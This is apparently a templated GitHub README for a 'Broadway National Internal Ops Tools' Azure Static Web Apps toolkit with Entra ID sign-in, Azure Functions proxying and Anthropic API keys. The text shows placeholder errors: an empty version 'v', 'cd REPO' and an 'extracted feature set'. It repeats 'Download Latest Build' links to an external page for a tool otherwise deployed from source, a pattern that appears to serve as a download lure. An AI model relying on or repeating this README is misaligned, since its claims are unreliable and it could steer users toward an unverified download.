# Broadway National Internal Ops Tools - internal ops tools 2026

> **Broadway National Internal Ops Tools is an Azure Static Web Apps-based internal operations toolkit for 2026, bringing together HTML frontends, Entra ID sign-in, Azure Functions, blob storage, and API proxying in one deployment-ready package.**

[![Platform](https://img.shields.io/badge/Platform-Azure%20Static%20Web%20Apps-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaacbzprice1887/broadway-internal-ops-toolkit?style=flat-square)](https://github.com/isaacbzprice1887/broadway-internal-ops-toolkit)

---

<p align="center">
  <a href="https://isaacbzprice1887.github.io/broadway-internal-ops-toolkit/">
    <img src="https://img.shields.io/badge/Download-Broadway%20National%20Internal%20Ops%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download Broadway National Internal Ops Tools">
  </a>
</p>

> **[Direct Download - Broadway National Internal Ops Tools v](https://isaacbzprice1887.github.io/broadway-internal-ops-toolkit/)**

---

[Download Latest Build](https://isaacbzprice1887.github.io/broadway-internal-ops-toolkit/)

---

## Overview

Broadway National Internal Ops Tools is a browser-first workspace for internal operational tasks, built around HTML tool pages that are meant to run on Azure Static Web Apps. It suits teams that want a centralized set of utilities without the overhead of a separate desktop client or a more complex server application.

The stack ties together identity-based access, serverless endpoints, and lightweight storage so routine admin work can live behind a single web deployment. That makes it a practical fit for internal teams that need a simple interface for tooling, API access, and basic state persistence within the Azure ecosystem.

---

## Capabilities

- HTML-based frontends for internal tools
- Azure Static Web Apps hosting model
- Entra ID authentication for organization sign-in
- Azure Functions API proxy for backend requests
- Blob-backed JSON key-value storage for simple data handling
- Migration support from Netlify-based setups
- CI/CD automation through GitHub Actions
- Anthropic API connectivity as part of the tool stack

---

## Installation

Clone or download the repository, then open the project in your preferred editor.

    git clone https://github.com/isaacbzprice1887/broadway-internal-ops-toolkit.git
    cd REPO

Once the files are local, deploy through Azure Static Web Apps or use the repository's build and workflow steps as configured. If you are using the hosted build, use the latest download link above to access the current release package.

---

## Usage

This toolkit is designed for internal workflows. In practice, users authenticate with Entra ID, open the HTML tool pages, and rely on Azure Functions for API-oriented actions handled by the front end.

Typical workflow:

1. Open the deployed site.
2. Sign in with the organization account flow.
3. Use the available internal tool pages.
4. Store or retrieve small records through blob-backed JSON data.
5. Route external API requests through the proxy layer when required.

If you are operating the repository locally, follow the project build and deployment flow before exposing it to users.

---

## Configuration

Most behavior is controlled by deployment settings instead of a large local configuration file. The common values are usually provided through the Azure and GitHub deployment environment.

Example environment-style settings:

    ENTRA_ID_TENANT_ID=
    ENTRA_ID_CLIENT_ID=
    AZURE_STORAGE_CONNECTION_STRING=
    ANTHROPIC_API_KEY=
    FUNCTIONS_BASE_URL=

Set these in the hosting environment, workflow secrets, or application configuration used by your deployment.

---

## Requirements

- Azure Static Web Apps for hosting
- Azure Functions for API proxy endpoints
- Azure Blob Storage for JSON-backed storage
- Entra ID for authentication
- GitHub Actions for CI/CD automation
- A modern browser for the HTML interface
- Access to any external API credentials used by the deployment, such as Anthropic API keys

---

## FAQ

**How are updates delivered?**  
Via the repository deployment pipeline, generally through GitHub Actions and the Azure hosting setup.

**Where is application data kept?**  
The project stores lightweight persistence in blob-backed JSON key-value storage.

**Can this be moved from another host?**  
Yes. Migration support from Netlify is included in the extracted feature set.

**What should I verify if login fails?**  
Check the Entra ID configuration, tenant values, and deployment secrets in the Azure environment.

**Where should configuration changes be made?**  
Review the Azure Static Web Apps settings, Functions environment variables, and GitHub Actions workflow definitions.

**What if API requests stop working?**  
Inspect the Azure Functions proxy configuration, backend credentials, and any required API keys.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
